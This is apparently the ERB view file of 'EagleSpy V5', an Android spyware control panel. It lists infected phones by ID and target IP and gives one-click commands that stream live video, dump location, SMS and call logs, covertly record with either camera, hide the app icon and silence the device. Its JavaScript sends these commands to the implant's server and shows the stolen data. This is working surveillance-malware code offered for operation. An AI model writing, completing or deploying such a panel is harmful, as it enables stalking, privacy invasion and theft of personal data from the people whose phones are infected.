<%= javascript_include_tag "application" %>
<!-- modern_dashboard loaded inline -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EagleSpy V5 - Simple</title>
<style>
  body { background: #0a0a0f; color: #ccc; font-family: sans-serif; padding: 20px; }
  .device { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; background: #111; }
  .device h3 { margin: 0 0 10px; color: #fff; display: flex; justify-content: space-between; }
  .status { font-size: 0.8em; color: #666; }
  .online { color: #0f0; }
  .offline { color: #555; }
  .btn-group { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
  button { background: #222; border: 1px solid #444; color: #ddd; padding: 5px 10px; cursor: pointer; border-radius: 3px; }
  button:hover { background: #333; border-color: #00d4ff; color: #fff; }
  #log { margin-top: 20px; border: 1px solid #333; background: #000; padding: 10px; height: 300px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; }
  .live-view { display: none; margin-top: 10px; border: 1px solid #444; padding: 10px; background: #1a1a1a; }
  .live-view.active { display: block; }
  iframe { width: 100%; height: 300px; border: none; }
  img.preview { max-width: 100%; max-height: 300px; display: block; margin-top: 5px; }
</style>
</head>
<body>

<h1>EagleSpy V5 <span style="font-size:0.5em;color:#666">Simple Dashboard</span></h1>
  <div id="devices-list">
    <% @devices.each do |device| %>
      <div class="device">
        <h3>
          <%= device.name || "Device #{device.device_id}" %> 
          <span class="status <%= device.updated_at && device.updated_at > 5.minutes.ago ? 'online' : 'offline' %>">
             <%= device.updated_at && device.updated_at > 5.minutes.ago ? '● Online' : '○ Offline' %>
          </span>
        </h3>
        <div style="font-size:0.8em; margin-bottom:5px">ID: <%= device.device_id %> | IP: <%= device.apk_installation&.target_ip %></div>
        
        <div class="btn-group">
          <!-- Live Features -->
          <button onclick="sendCommand('<%= device.id %>', 'start_webrtc_stream')">🔴 Live Video</button>
          <button onclick="sendCommand('<%= device.id %>', 'dump_localtime')">📍 Location</button>
          <button onclick="sendCommand('<%= device.id %>', 'webcam_record', {back_camera: true})">🎥 Rec Back</button>
          <button onclick="sendCommand('<%= device.id %>', 'webcam_record', {back_camera: false})">🤳 Rec Front</button>
          
          <!-- Data -->
          <button onclick="sendCommand('<%= device.id %>', 'take_picture')">📸 Photo</button>
          <button onclick="sendCommand('<%= device.id %>', 'dump_sysinfo')">ℹ️ Sys Info</button>
          <button onclick="sendCommand('<%= device.id %>', 'dump_sms')">💬 SMS</button>
          <button onclick="sendCommand('<%= device.id %>', 'dump_calllogs')">📞 Calls</button>
          
          <!-- Controls -->
          <button onclick="sendCommand('<%= device.id %>', 'hide_app')">🙈 Hide Icon</button>
          <button onclick="sendCommand('<%= device.id %>', 'show_app')">👁️ Show Icon</button>
          <button onclick="sendCommand('<%= device.id %>', 'set_audio_mode', {mode: 'silent'})">🔇 Silent</button>
          <button onclick="sendCommand('<%= device.id %>', 'set_audio_mode', {mode: 'normal'})">🔊 Normal</button>
        </div>
      </div>
    <% end %>
  </div>

  <% if @devices.empty? %>
    <div style="text-align:center; padding: 50px; color: #555;">No devices found. Install APK.</div>
  <% end %>

<div id="live-container" class="live-view">
  <h3>Live View <button onclick="closeLive()">Close</button></h3>
  <div id="live-content"></div>
</div>

<div id="log">Logs will appear here...</div>

<script>
const API_BASE = window.location.origin;

function log(msg, type='info') {
  const el = document.getElementById('log');
  const time = new Date().toLocaleTimeString();
  el.innerHTML = `[${time}] ${msg}\n` + el.innerHTML;
}

async function fetchDevices() {
  try {
    const res = await fetch('/api/devices/online');
    const devices = await res.json(); // Expecting array of devices
    renderDevices(devices);
  } catch (e) {
    // Fallback to rendering from HTML if API fails (using embedded ruby data if this was erb)
    // But since this is pure HTML, we rely on API.
    // Let's try to get them from the main dashboard HTML if needed, or just list a default if testing.
    // For now, let's assume the Ruby endpoint works or we parse the page.
    
    // Actually, let's use the ruby provided @devices if we can. 
    // Since we are editing index.html.erb, we can use ruby loops.
  }
}

// Commands
async function sendCommand(deviceId, command, params = {}) {
  log(`Sending ${command} to ${deviceId}...`);
  try {
    // Determine URL based on command
    let url = `/smartphones/${command}?smartphone_id=${deviceId}`;
    let method = 'POST';
    
    // Map commands to specific endpoints if needed
    if (command === 'take_picture') url = `/smartphones/take_picture?smartphone_id=${deviceId}`;
    if (command === 'dump_location') { url = `/geo_locations/dump_location?smartphone_id=${deviceId}`; method = 'GET'; }
    if (command === 'start_webrtc_stream') url = `/smartphones/start_webrtc_stream?smartphone_id=${deviceId}`;
    
    // Convert params to query string for GET, or body for POST if needed
    // For simplicity in this Rails app, most are POST with query params or body
    
    // Add params to URL
    const qs = new URLSearchParams(params).toString();
    if (qs) url += `&${qs}`;

    const res = await fetch(url, {
      method: method,
      headers: {
        'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content,
        'Accept': 'text/javascript, application/json' // Request JS/JSON response
      }
    });

    const text = await res.text();
    
    // Attempt to extract JSON or just log text
    try {
      // If response is JS (from .js.erb), it might contain "commandOutput"
      if (text.includes('commandOutput')) {
         const match = text.match(/commandOutput\s*=\s*(.*);/);
         if (match) {
           const output = JSON.parse(match[1]); // It might be a JS array/object string
           log(`Result: ${JSON.stringify(output, null, 2)}`, 'success');
           handleResult(command, output);
           return;
         }
      }
      const json = JSON.parse(text);
      log(`Result: ${JSON.stringify(json, null, 2)}`, 'success');
      handleResult(command, json);
    } catch (e) {
      log(`Response: ${text.substring(0, 100)}...`, 'info');
    }

  } catch (e) {
    log(`Error: ${e.message}`, 'error');
  }
}

function handleResult(command, data) {
  const container = document.getElementById('live-content');
  const view = document.getElementById('live-container');
  
  if (command === 'dump_location') {
     // Expecting lat/long or map url
     // If data is array ["Location: ..."]
     view.classList.add('active');
     container.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
     // If we had real lat/long, we'd show iframe
  }
  
  if (command === 'take_picture') {
    // If we get a URL back
    if (Array.isArray(data) && data[0].includes('http')) {
       view.classList.add('active');
       container.innerHTML = `<img src="${data[0]}" class="preview" />`;
    }
  }
  
  if (command === 'start_webrtc_stream') {
    // Inject the WebRTC JS
    view.classList.add('active');
    container.innerHTML = '<div>Starting WebRTC... check console for stream</div>';
    // Ideally execute the returned JS
  }
}

function closeLive() {
  document.getElementById('live-container').classList.remove('active');
}

</script>

